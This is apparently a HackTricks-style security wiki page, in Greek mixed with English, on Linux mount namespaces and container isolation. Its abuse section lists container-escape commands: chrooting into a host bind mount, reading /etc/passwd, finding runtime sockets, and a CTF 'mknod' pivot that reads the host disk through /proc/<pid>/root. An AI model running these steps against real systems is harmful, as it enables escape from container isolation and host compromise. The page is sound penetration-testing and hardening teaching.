# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

The mount namespace controls the **mount table** that a process sees. This is one of the most important container isolation features because the root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, and many runtime-specific helper mounts are all expressed through that mount table. Two processes may both access `/`, `/proc`, `/sys`, or `/tmp`, but what those paths resolve to depends on the mount namespace they are in.

Από την άποψη της ασφάλειας των containers, το mount namespace συχνά κάνει τη διαφορά μεταξύ «αυτό είναι ένα προσεκτικά προετοιμασμένο application filesystem» και «αυτή η διεργασία μπορεί να δει ή να επηρεάσει άμεσα το host filesystem». Γι' αυτό τα bind mounts, οι `hostPath` volumes, οι privileged mount operations και οι εγγράψιμες εκθέσεις του `/proc` ή `/sys` σχετίζονται όλα με αυτό το namespace.

## Λειτουργία

When a runtime launches a container, it usually creates a fresh mount namespace, prepares a root filesystem for the container, mounts procfs and other helper filesystems as needed, and then optionally adds bind mounts, tmpfs mounts, secrets, config maps, or host paths. Once that process is running inside the namespace, the set of mounts it sees is largely decoupled from the host's default view. The host may still see the real underlying filesystem, but the container sees the version assembled for it by the runtime.

Αυτό είναι ισχυρό γιατί επιτρέπει στο container να πιστεύει ότι έχει το δικό του root filesystem ακόμα κι αν ο host εξακολουθεί να διαχειρίζεται τα πάντα. Είναι επίσης επικίνδυνο γιατί αν το runtime εκθέσει το λάθος mount, η διεργασία αποκτά ξαφνικά ορατότητα σε πόρους του host που το υπόλοιπο μοντέλο ασφάλειας μπορεί να μην έχει σχεδιαστεί να προστατεύει.

## Εργαστήριο

Μπορείτε να δημιουργήσετε ένα ιδιωτικό mount namespace με:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Αν ανοίξετε ένα άλλο shell έξω από αυτό το namespace και ελέγξετε το mount table, θα δείτε ότι το tmpfs mount υπάρχει μόνο μέσα στο απομονωμένο mount namespace. Αυτή είναι μια χρήσιμη άσκηση επειδή δείχνει ότι η mount isolation δεν είναι αφηρημένη θεωρία· ο kernel παρουσιάζει κυριολεκτικά ένα διαφορετικό mount table στη διεργασία.
Αν ανοίξετε ένα άλλο shell έξω από αυτό το namespace και ελέγξετε το mount table, το tmpfs mount θα υπάρχει μόνο μέσα στο απομονωμένο mount namespace.

Μέσα σε containers, μια γρήγορη σύγκριση είναι:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Το δεύτερο παράδειγμα δείχνει πόσο εύκολα μια runtime ρύθμιση μπορεί να «τρυπήσει» το όριο του filesystem.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O βασίζονται σε ένα ιδιωτικό mount namespace για τα κανονικά containers. Kubernetes χτίζει πάνω στον ίδιο μηχανισμό για volumes, projected secrets, config maps, και `hostPath` mounts. Τα περιβάλλοντα Incus/LXC επίσης στηρίζονται σε μεγάλο βαθμό στα mount namespaces, ειδικά επειδή τα system containers συχνά εκθέτουν πιο πλούσια και πιο «μηχανικά» filesystems από ό,τι τα application containers.

Αυτό σημαίνει ότι όταν εξετάζετε ένα πρόβλημα με το filesystem ενός container, συνήθως δεν κοιτάτε μια απομονωμένη ιδιορρυθμία του Docker. Κοιτάτε ένα πρόβλημα mount-namespace και runtime-configuration που εκφράζεται μέσω της πλατφόρμας που εκκίνησε το workload.

## Misconfigurations

Το πιο προφανές και επικίνδυνο λάθος είναι η έκθεση του host root filesystem ή κάποιου άλλου ευαίσθητου host path μέσω bind mount, για παράδειγμα `-v /:/host` ή ένα εγγράψιμο `hostPath` στο Kubernetes. Σε αυτό το σημείο, το ερώτημα δεν είναι πλέον "can the container somehow escape?" αλλά μάλλον "how much useful host content is already directly visible and writable?" Ένα εγγράψιμο host bind mount συχνά μετατρέπει το υπόλοιπο του exploit σε απλό θέμα τοποθέτησης αρχείων, chrooting, τροποποίησης config ή ανακάλυψης runtime sockets.

Ένα ακόμη συνηθισμένο πρόβλημα είναι η έκθεση του host `/proc` ή `/sys` με τρόπους που παρακάμπτουν την ασφαλέστερη προβολή του container. Αυτά τα filesystems δεν είναι συνηθισμένα data mounts· είναι διεπαφές στην κατάσταση του kernel και των processes. Αν το workload φτάνει απευθείας στις host εκδόσεις, πολλές από τις υποθέσεις πίσω από το hardening των containers παύουν να ισχύουν ομαλά.

Οι προστασίες read-only μετρούν επίσης. Ένα read-only root filesystem δεν ασφαλίζει μαγικά ένα container, αλλά αφαιρεί μεγάλο μέρος του χώρου προετοιμασίας του επιτιθέμενου και δυσκολεύει την persistence, την τοποθέτηση helper-binaries και την αλλοίωση config. Αντιστρόφως, ένα εγγράψιμο root ή εγγράψιμο host bind mount δίνει στον επιτιθέμενο χώρο για να προετοιμάσει το επόμενο βήμα.

## Abuse

Όταν το mount namespace καταχράται, οι επιτιθέμενοι συνήθως κάνουν ένα από τέσσερα πράγματα. Αυτοί **διαβάζουν δεδομένα του host** που θα έπρεπε να μείνουν εκτός του container. Αυτοί **τροποποιούν τη διαμόρφωση του host** μέσω εγγράψιμων bind mounts. Αυτοί **mount ή remount πρόσθετους πόρους** αν τα capabilities και το seccomp το επιτρέπουν. Ή **προσεγγίζουν ισχυρά sockets και runtime state directories** που τους επιτρέπουν να ζητήσουν από την ίδια την πλατφόρμα container περισσότερη πρόσβαση.

Αν το container μπορεί ήδη να δει το host filesystem, το υπόλοιπο μοντέλο ασφάλειας αλλάζει αμέσως.

Όταν υποψιάζεστε έναν host bind mount, πρώτα επιβεβαιώστε τι είναι διαθέσιμο και αν είναι εγγράψιμο:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Εάν το host root filesystem είναι mounted read-write, η direct host access είναι συχνά τόσο απλή όσο:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Εάν ο στόχος είναι privileged runtime access αντί για άμεσο chrooting, απαριθμήστε sockets και runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Αν το `CAP_SYS_ADMIN` υπάρχει, ελέγξτε επίσης αν μπορούν να δημιουργηθούν νέες mounts από μέσα στο container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Πλήρες Παράδειγμα: Two-Shell `mknod` Pivot

Μια πιο εξειδικευμένη διαδρομή κατάχρησης εμφανίζεται όταν ο container root user μπορεί να δημιουργήσει block devices, ο host και το container μοιράζονται ένα user identity με χρήσιμο τρόπο, και ο attacker έχει ήδη ένα low-privilege foothold στον host. Σε αυτή την περίπτωση, το container μπορεί να δημιουργήσει ένα device node όπως `/dev/sda`, και ο low-privilege host user μπορεί αργότερα να το διαβάσει μέσω του `/proc/<pid>/root/` για τη matching container process.

Μέσα στο container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Από το host, ως ο αντίστοιχος low-privilege user, αφού εντοπίσετε το container shell PID:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Το σημαντικό μάθημα δεν είναι η ακριβής αναζήτηση CTF string. Είναι ότι η έκθεση του mount-namespace μέσω του `/proc/<pid>/root/` μπορεί να επιτρέψει σε έναν host user να επαναχρησιμοποιήσει device nodes που δημιουργήθηκαν από container, ακόμα και όταν η cgroup device policy εμπόδιζε την άμεση χρήση μέσα στο ίδιο το container.

## Checks

Αυτές οι εντολές υπάρχουν για να σας δείξουν την προβολή του filesystem στην οποία βρίσκεται πραγματικά η τρέχουσα διεργασία. Ο στόχος είναι να εντοπίσετε host-derived mounts, εγγράψιμα ευαίσθητα paths, και οτιδήποτε φαίνεται πιο ευρύ από το κανονικό root filesystem ενός application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Τι είναι ενδιαφέρον εδώ:

- Τα bind mounts από τον host, ειδικά `/`, `/proc`, `/sys`, runtime state directories, ή socket locations, πρέπει να ξεχωρίζουν αμέσως.
- Τα απροσδόκητα read-write mounts είναι συνήθως πιο σημαντικά από μεγάλο αριθμό read-only helper mounts.
- `mountinfo` είναι συχνά το καλύτερο μέρος για να διαπιστώσετε αν μια διαδρομή είναι πραγματικά host-derived ή overlay-backed.

Αυτοί οι έλεγχοι καθορίζουν **ποιοι πόροι είναι ορατοί σε αυτό το namespace**, **ποιοι από αυτούς είναι host-derived**, και **ποιοι από αυτούς είναι εγγράψιμοι ή ευαίσθητοι από άποψη ασφάλειας**.
